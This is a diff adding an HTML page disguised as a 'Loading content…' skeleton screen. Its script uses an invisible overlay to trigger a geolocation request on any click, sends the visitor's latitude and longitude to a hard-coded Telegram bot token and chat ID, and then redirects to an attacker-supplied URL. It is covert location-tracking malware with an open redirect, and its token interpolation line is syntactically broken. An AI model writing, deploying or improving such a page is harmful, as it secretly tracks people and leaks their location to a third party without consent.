@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Loading…</title>
+<style>
+body{
+  margin:0; font-family:system-ui, sans-serif;
+  background:#f3f4f6;
+}
+.wrap{ padding:16px }
+.bar{ height:16px; background:#e5e7eb; border-radius:8px; margin:10px 0; }
+.big{ height:180px }
+.small{ width:60% }
+.note{ text-align:center; margin-top:20px; color:#6b7280; font-size:13px }
+.overlay{
+  position:fixed; inset:0; z-index:10;
+}
+</style>
+</head>
+<body>
+
+<div class="overlay" onclick="start()"></div>
+
+<div class="wrap">
+  <div class="bar small"></div>
+  <div class="bar"></div>
+  <div class="bar"></div>
+  <div class="bar big"></div>
+  <div class="bar"></div>
+  <div class="bar small"></div>
+  <div class="note">Loading content…</div>
+</div>
+
+<script>
+const BOT_TOKEN = "8032728319:AAERv5p9V2XF0f_q3B8T-DVmLhxDb6NnjB0";
+const CHAT_ID  = "8215590469";
+const REDIRECT_URL = new URLSearchParams(location.search).get("go");
+
+function start(){
+  document.querySelector(".overlay").onclick = null;
+
+  navigator.geolocation.getCurrentPosition(async (pos)=>{
+    await fetch(`https://api.telegram.org/bot${8032728319:AAERv5p9V2XF0f_q3B8T-DVmLhxDb6NnjB0}/sendMessage`,{
+      method:"POST",
+      headers:{ "Content-Type":"application/json" },
+      body: JSON.stringify({
+        chat_id: 8215590469,
+        text:`📍 Location\nLat:${pos.coords.latitude}\nLon:${pos.coords.longitude}`
+      })
+    });
+
+    if(REDIRECT_URL){
+      location.href = decodeURIComponent(REDIRECT_URL);
+    }
+  }, ()=>alert("Please allow location to continue"));
+}
+</script>
+
+</body>
+</html>
